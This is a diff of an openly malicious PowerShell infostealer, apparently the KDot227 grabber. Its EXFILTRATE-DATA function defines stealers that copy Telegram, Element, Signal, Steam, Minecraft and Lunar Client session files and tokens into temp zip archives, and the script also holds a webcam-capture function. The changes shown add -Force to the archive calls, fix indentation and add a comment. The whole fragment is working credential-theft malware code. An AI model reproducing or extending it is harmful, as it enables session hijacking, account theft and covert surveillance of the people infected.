@@ -91,7 +91,7 @@ function EXFILTRATE-DATA {
         $destination = "$env:localappdata\temp\telegram-session.zip"
         $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
         $files = Get-ChildItem -Path $path -Exclude $exclude
-        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest
+        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
     }
     telegramstealer 
     
@@ -108,7 +108,7 @@ function EXFILTRATE-DATA {
         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
         Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
         $element_zip = "$env:localappdata\temp\element-session.zip"
-        Compress-Archive -Path $element_session -DestinationPath $element_zip -CompressionLevel Fastest
+        Compress-Archive -Path $element_session -DestinationPath $element_zip -CompressionLevel Fastest -Force
     }
     elementstealer 
     
@@ -125,7 +125,7 @@ function EXFILTRATE-DATA {
         Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
         Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
         $signal_zip = "$env:localappdata\temp\signal-session.zip"
-        Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest
+        Compress-Archive -Path $signal_session -DestinationPath $signal_zip -CompressionLevel Fastest -Force
     }
     signalstealer 
 
@@ -142,20 +142,20 @@ function EXFILTRATE-DATA {
             Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
         }
         $steam_zip = "$env:localappdata\temp\steam-session.zip"
-        Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
+        Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest -Force
     }
     steamstealer 
     
     # Minecraft Session Stealer
     function minecraftstealer {
-            $minecraft_session = "$env:localappdata\temp\minecraft-session"
-            New-Item -ItemType Directory -Force -Path $minecraft_session
-            $minecraftfolder1 = $env:appdata + "\.minecraft"
-            $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
-            Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
-            Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
-            $minecraft_zip = "$env:localappdata\temp\minecraft-session.zip"
-            Compress-Archive -Path $minecraft_session -DestinationPath $minecraft_zip -CompressionLevel Fastest
+        $minecraft_session = "$env:localappdata\temp\minecraft-session"
+        New-Item -ItemType Directory -Force -Path $minecraft_session
+        $minecraftfolder1 = $env:appdata + "\.minecraft"
+        $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
+        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
+        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
+        $minecraft_zip = "$env:localappdata\temp\minecraft-session.zip"
+        Compress-Archive -Path $minecraft_session -DestinationPath $minecraft_zip -CompressionLevel Fastest -Force
     }
     minecraftstealer 
     
@@ -469,6 +469,7 @@ function Get-WebCamImage {
     # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
     # he did 99% of the work
     # other 1% modified by KDot227
+    # had to half learn c# to figure anything out (I still don't understand it)
     $source=@" 
     using System; 
     using System.Collections.Generic; 
